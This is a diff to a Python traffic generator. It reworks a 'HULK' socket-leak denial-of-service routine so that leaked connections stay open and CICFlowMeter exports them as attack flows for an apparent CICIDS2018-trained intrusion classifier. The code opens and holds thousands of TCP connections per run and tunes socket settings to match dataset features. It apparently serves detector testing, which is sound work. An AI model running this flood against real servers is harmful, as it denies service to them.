@@ -17,6 +17,33 @@ import random
 import string
 import struct
 
+# ── Global pool for leaked HULK sockets ──────────────────
+# Socket-leak HULK holds sockets open so CICFlowMeter exports
+# flows with RST=0. Closing during capture would send RSTs that
+# either pollute the original flow (RST=1 → YELLOW) or create
+# tiny cleanup flows (GREEN). Sockets are stored globally and
+# cleaned up AFTER the user stops classification.
+_HULK_LEAKED_SOCKETS = []
+_HULK_LEAKED_LOCK = threading.Lock()
+
+
+def cleanup_hulk_leaked():
+    """Close all globally held leaked HULK sockets.
+
+    Call AFTER stopping classification so the RST packets
+    aren't captured by CICFlowMeter.
+    """
+    with _HULK_LEAKED_LOCK:
+        count = len(_HULK_LEAKED_SOCKETS)
+        for sock in _HULK_LEAKED_SOCKETS:
+            try:
+                sock.close()
+            except Exception:
+                pass
+        _HULK_LEAKED_SOCKETS.clear()
+    if count:
+        print(f"[OK] Cleaned up {count} leaked HULK sockets")
+
 # TCP receive buffer sizes → Init Fwd Win Byts feature.
 # Values derived from CICIDS2018 training data per-class medians/distributions:
 # SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
@@ -159,27 +186,18 @@ class DoSAttack:
         """
         end_time = time.time() + self.duration
 
-        # Socket pool: track (socket, open_time) for lifecycle management
+        # Local socket list. Transferred to global pool at end.
         leaked = []
-        # Max sockets per thread. With 10 threads: 500*10=5000 total FDs.
-        max_leaked = 500
-        # Hold sockets this long before closing. Must exceed:
-        #   CICFlowMeter idle_threshold (15s) + GC_interval (10s) = 25s
-        hold_time = 30.0
+        # Safety limit: if pool fills, pause (don't close).
+        # With 10 threads × 1000 = 10K FDs max (ulimit raised to 16384).
+        max_leaked = 1000
 
         while self.running and time.time() < end_time:
-            now = time.time()
-
-            # Cleanup: close sockets held for > hold_time.
-            # CICFlowMeter has already exported these flows (idle > 15s + GC).
-            # close() sends RST → separate tiny flow → classified GREEN.
-            while leaked and (now - leaked[0][1] >= hold_time
-                             or len(leaked) >= max_leaked):
-                old_sock, _ = leaked.pop(0)
-                try:
-                    old_sock.close()
-                except Exception:
-                    pass
+            if len(leaked) >= max_leaked:
+                # Pool full — pause instead of force-closing sockets.
+                # Force-close would send RST that pollutes CICFlowMeter.
+                time.sleep(0.5)
+                continue
 
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -203,7 +221,7 @@ class DoSAttack:
                 # DON'T close, DON'T send data — leak the socket.
                 # CICFlowMeter sees: SYN+ACK (fwd) + SYN-ACK (bwd)
                 # After 15s idle → exported with RST=0, FIN=0 → RED
-                leaked.append((sock, time.time()))
+                leaked.append(sock)
 
             except Exception as e:
                 self._inc_error(str(e))
@@ -211,12 +229,14 @@ class DoSAttack:
             # ~5-10ms between connections (100-200 conn/s per thread)
             time.sleep(random.uniform(0.005, 0.010))
 
-        # Final cleanup: close all remaining leaked sockets
-        for sock, _ in leaked:
-            try:
-                sock.close()
-            except Exception:
-                pass
+        # CRITICAL: Do NOT close sockets here!
+        # Closing sends RST which either:
+        #   a) gets added to original flow → RST Flag Cnt=1 → YELLOW
+        #   b) creates tiny new flow → GREEN
+        # Instead, transfer to global pool. cleanup_hulk_leaked()
+        # is called AFTER the user stops classification.
+        with _HULK_LEAKED_LOCK:
+            _HULK_LEAKED_SOCKETS.extend(leaked)
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
